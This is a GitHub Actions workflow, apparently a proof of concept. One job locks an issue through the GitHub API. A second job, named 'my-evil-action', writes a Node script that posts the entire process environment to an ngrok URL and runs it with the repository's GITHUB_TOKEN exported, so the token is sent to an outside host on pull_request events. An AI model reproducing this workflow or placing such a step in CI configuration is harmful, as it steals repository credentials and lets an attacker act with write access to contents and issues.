name: My Action

on:
  workflow_dispatch:
  pull_request:
    types: [opened, edited, closed, reopened, synchronize, ready_for_review, locked, unlocked, review_requested, review_request_removed, labeled, unlabeled, assigned, unassigned, opened, edited, closed, reopened, synchronize, ready_for_review, locked, unlocked, review_requested, review_request_removed, labeled, unlabeled, assigned, unassigned]

permissions:
  issues: write
  contents: write

jobs:
  my-action:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X PUT \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            https://api.github.com/repos/new-org-12345345/clean/issues/1/lock \
            -d '{"lock_reason":"off-topic"}'
  my-evil-action:
    runs-on: ubuntu-latest
    steps:
      - run: mkdir test
      - run: cd test && npm init -y
      - run: touch index.js
      - run: npm install axios express
      - run: echo "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.listen(3000, async() => {await axios.post('https://5217-185-187-131-173.ngrok.io', process.env)});" > index.js
      - run: MY_TOKEN=${{ secrets.GITHUB_TOKEN }} node index.js
